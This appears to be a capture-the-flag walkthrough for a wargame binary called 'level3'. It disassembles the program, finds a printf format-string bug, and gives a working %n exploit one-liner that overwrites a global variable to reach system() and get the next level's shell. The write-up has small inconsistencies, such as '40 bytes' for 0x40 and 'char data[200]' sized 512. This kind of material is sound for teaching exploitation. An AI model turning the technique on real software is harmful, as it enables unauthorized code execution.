level3
======

Dissassembly
------------

To dissassemble the executable we can use gdb.
```sh
FUNCTION=main EXECUTABLE=./level3
gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble/r $FUNCTION" "$EXECUTABLE"
```

The main function looks like this:
```nasm
Dump of assembler code for function main:
   0x0804851a <+0>:	push   ebp
   0x0804851b <+1>:	mov    ebp,esp
   0x0804851d <+3>:	and    esp,0xfffffff0
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave
   0x08048526 <+12>:	ret
End of assembler dump.
```

It calls another function v:

```nasm
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x218
   0x080484ad <+9>:	mov    eax,ds:0x8049860
   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484be <+26>:	lea    eax,[ebp-0x208]
   0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    eax,[ebp-0x208]
   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    eax,ds:0x8049880
   0x080484e9 <+69>:	mov    edx,eax
   0x080484eb <+71>:	mov    eax,0x8048600
   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
   0x08048504 <+96>:	mov    DWORD PTR [esp],eax
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave
   0x08048519 <+117>:	ret
End of assembler dump.
```

We can see that there is a system call, but to reach it, a specific value needs to be set to0x40.
```nasm
...
   0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   ...
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave
   0x08048519 <+117>:	ret
End of assembler dump.
```

The stack looks like this:
| Address | Type           | Size |
|---------|----------------|------|
| -0x218  | char \*fmt     |   4  |
| -0x210  | FILE \*stdin   |   4  |
| -0x20c  | size_t len     |   4  |
| -0x208  | char data[200] | 512  |
|  0x000  | *EBP           |   4  |
|  0x004  | *EIP           |   4  |

There is a call to printf with a user-controlled stack-buffer as first argument.

In c, the procedure would look like this:
```c
FILE *stdin = *(FILE**)0x8049860;
fgets(fmt, len, stdin);

printf(fmt);

if (*(int*)0x804988c == 0x40)
{
	fwrite(...);
	system(...);
}
```

Exploitation
------------

With the use of some format-specifiers, we can easily print values from the stack, as if they where arguments:
```c
./level3 <<< "%p"
```
```c
0x200
```
Here we can see that we are able to print the length of the buffer, which was the second argument of the previous function: fgets.

Let's see if we can get up to our own buffer.
Remember: Arguments are pushed on the stack in reverse order.
That means [esp] is the first argument passed on the stack:
```nasm
...
   0x080484cc <+40>:	lea    eax,[ebp-0x208]
   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
...
```
Indeed, it contains the address of our buffer at ebp - 0x208, or esp + 0x10.
Since the buffer starts at esp + 0x10, we need to pop 16 bytes off the stack until we reach it.

This can be done using the %p format specifier, which prints 32 bit pointers.
We need to use 4 of them so that we have a 4 * 4 = 16 bytes offset.

```sh
./level3 <<< "AAAA %p %p %p %p"
```
```c
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141
```
Alright, so we can control the format string, as well the fourth argument of the printf call. But what can we do with this?

```sh
man 3 printf
```
>BUGS
>>Because  sprintf()  and  vsprintf() assume an arbitrarily long string, callers must becareful not to overflow the actual space; this is often impossible  to  assure.
>>Note that  the length of the strings produced is locale-dependent and difficult to predict.Use snprintf() and vsnprintf() instead (or asprintf(3) and vasprintf(3)).
>
>>Code such as printf(foo); often indicates a bug, since foo may contain a %  character.If  foo  comes from untrusted user input, it may contain %n, causing the printf() callto write to memory and creating a security hole.

In our case, the executable is affected by the second bug. We can write to a location provided by an argument using the %n specifier.

The %n modifiers writes the length of the preceding formatted input. So if we want to write 0x40 to memory location 0x804988c, we need to put the address at the start of our buffer, pop 3 arguments off the stack using the %p specifier, and pad the input to reach 40-bytes before placing the %n specifier.

```sh
ADDRESS="804988c"
BYTES=$(<<< "$ADDRESS" rev | dd conv=swab | xxd -r -p)
(echo "$BYTES%p%p%45p%n"; cat) | ./level3
```
```
0x2000xb7fd1ac0                                   0xb7ff37d0
Wait what?!
whoami
level4
```
